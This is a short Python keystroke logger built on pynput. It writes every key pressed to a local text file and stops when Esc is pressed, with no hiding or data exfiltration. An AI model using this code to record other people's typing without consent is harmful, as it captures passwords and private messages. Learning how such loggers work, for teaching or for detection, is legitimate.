from pynput.keyboard import Key, Listener
log_file = "simple_key_log.txt"
def log_key(key):
    with open(log_file, "a") as file:
        try:
            file.write(f"{key.char}") 
        except AttributeError:
            if key == Key.space:
                file.write(" ") 
            elif key == Key.enter:
                file.write("\n")  
            else:
                file.write(f"[{str(key)}]") 
def stop_logging(key):
    if key == Key.esc:
        return False 
with Listener(on_press=log_key, on_release=stop_logging) as listener:
    listener.join()
